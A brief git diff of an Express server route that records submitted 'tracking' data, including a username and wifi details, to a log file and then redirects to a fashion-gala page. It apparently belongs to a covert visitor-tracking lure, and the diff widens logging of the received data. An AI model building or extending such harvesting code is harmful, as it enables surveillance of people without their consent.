@@ -67,6 +67,8 @@ app.post('/submit', limiter, async (req, res) => {
       wifi: extra?.wifi || null
     };
 
+    console.log('📡 EMPFANGENE DATEN:', trackingData);
+
     fs.appendFileSync(
       path.join(LOG_DIR, 'tracking.log'),
       JSON.stringify(trackingData) + '\n'
@@ -79,15 +81,9 @@ app.post('/submit', limiter, async (req, res) => {
       );
     }
 
-    console.log(`📍 Tracking erfolgreich: ${trackingData.username}`);
     res.redirect('/fashion-gala.html');
-
   } catch (error) {
-    console.error('❌ Render Tracking Error:', error);
-    fs.appendFileSync(
-      path.join(LOG_DIR, 'errors.log'),
-      `${new Date().toISOString()}|${error.stack}\n`
-    );
+    console.error('❌ FEHLER:', error.message, req.body);
     res.status(500).json({ error: "Internal server error" });
   }
 });
